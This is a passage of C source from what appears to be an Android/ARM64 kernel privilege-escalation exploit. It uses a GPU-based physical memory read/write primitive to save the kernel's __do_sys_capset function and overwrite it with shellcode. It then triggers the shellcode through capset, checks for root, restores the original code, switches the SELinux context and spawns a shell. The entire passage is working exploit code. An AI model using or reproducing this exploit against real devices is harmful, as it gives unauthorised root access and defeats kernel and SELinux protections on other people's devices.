                uint32_t sys_capset[sizeof(shellcode) / sizeof(uint32_t)];
                fprintf(stderr, "save... (via GPU read)\n");
                for (size_t i = 0; i < sizeof(shellcode) / sizeof(uint32_t); i++) {
                    uint64_t pa_to_read = kernel___do_sys_capset_pa + (i * 4);
                    uint64_t read_val_64 = fast_pread_u64(&cheese, pa_to_read & ~0x7ULL);
                    if ((pa_to_read & 0x4) == 0) {
                        sys_capset[i] = (uint32_t)(read_val_64 & 0xFFFFFFFF);
                    } else {
                        sys_capset[i] = (uint32_t)(read_val_64 >> 32);
                    }
                }

                fprintf(stderr, "Original __do_sys_capset code:\n");
                for (size_t i = 0; i < sizeof(sys_capset) / sizeof(uint32_t); i++) {
                    fprintf(stderr, "  [%02zx] %08x\n", i * 4, sys_capset[i]);
                }

                fprintf(stderr, "Shellcode to write:\n");
                for (size_t i = 0; i < sizeof(shellcode) / sizeof(uint32_t); i++) {
                    fprintf(stderr, "  [%02zx] %08x\n", i * 4, shellcode[i]);
                }

                /* Patching sys_capset with our shellcode via CPU physical write - CURRENTLY DISABLED */
                // TO ENABLE LATER: Uncomment the next 2 lines to enable shellcode write
                fprintf(stderr, "patch... (via CPU write)\n");
                fast_pwrite_bytes(&cheese, kernel___do_sys_capset_pa, shellcode, sizeof(shellcode));


                // For instruction cache clearing, we still need a virtual address.
                // The page is now mapped by fast_pwrite_bytes, so we can get the pointer.
                uint64_t syscall_page_offset = kernel___do_sys_capset_pa & 0xFFF;
                char* kernel___do_sys_capset_ptr = (char*)g_fast_rw.map + syscall_page_offset;

                // Clear caches BEFORE restoring PTE
                fprintf(stderr, "Clearing caches for patched code...\n");
                for (size_t i = 0; i < sizeof(shellcode); i += g_level1_dcache_size) {
                    __asm__ volatile("dc cvau, %0" : : "r"(kernel___do_sys_capset_ptr + i) : "memory");
                }
                __asm__ volatile("dsb ish\n" : : : "memory");
                for (size_t i = 0; i < sizeof(shellcode); i += g_level1_dcache_size) {
                    __asm__ volatile("ic ivau, %0" : : "r"(kernel___do_sys_capset_ptr + i) : "memory");
                }
                __asm__ volatile("dsb ish\nisb\n" : : : "memory");
                fprintf(stderr, "Caches cleared.\n");

                // DON'T restore PTE here - keep it mapped for the syscall

        fprintf(stderr, "call...\n");
        /* Calling our patched version of sys_capset */
        #pragma clang diagnostic push
        #pragma clang diagnostic ignored "-Wnonnull"
        int err = capset(NULL, NULL);
        fprintf(stderr, "called...\n");
        #pragma clang diagnostic pop

        // Add debugging output here
        fprintf(stderr, "UID: %d, EUID: %d\n", getuid(), geteuid());
        // system("id");

        // Restore the original code using the fast CPU-based write.
        fprintf(stderr, "restore... (via CPU write)\n");

        fast_pwrite_bytes(&cheese, kernel___do_sys_capset_pa, sys_capset, sizeof(sys_capset));

        // The page is still mapped from the patch. We can proceed to flush caches.
        // Clear caches for the restored code
        fprintf(stderr, "Clearing caches for restored code...\n");
        for (size_t i = 0; i < sizeof(sys_capset); i += g_level1_dcache_size) {
            __asm__ volatile("dc cvau, %0" : : "r"(kernel___do_sys_capset_ptr + i) : "memory");
        }
        __asm__ volatile("dsb ish\n" : : : "memory");
        for (size_t i = 0; i < sizeof(sys_capset); i += g_level1_dcache_size) {
            __asm__ volatile("ic ivau, %0" : : "r"(kernel___do_sys_capset_ptr + i) : "memory");
        }
        __asm__ volatile("dsb ish\nisb\n" : : : "memory");
        fprintf(stderr, "restored...\n");

        // Restore original PTE for page A to avoid leaving a stray kernel mapping.
        g_fast_rw.page_map[g_fast_rw.pte_a_index] = g_fast_rw.original_pte_a;
        flush_tlb_mprotect(g_fast_rw.map, PAGE_SIZE);

        if (err) {
            fprintf(stderr, "capset returned %d\n", err);
            return 1;
        }

        if (getuid() != 0) {
            fprintf(stderr, "failed to get root - rerun?\n");
            free(kernel_data);
            return 1;
        }

        stupid_setexeccon("u:r:shell:s0"); // otherwise binder doesn't work
        free(kernel_data);
    }

    char* const just_sh[] = {"sh", NULL};
    char* const* new_argv = argc > 1? argv + 1: just_sh;

    execvp(new_argv[0], new_argv);
    fprintf(stderr, "can't exec?\n");

    return 0;
}
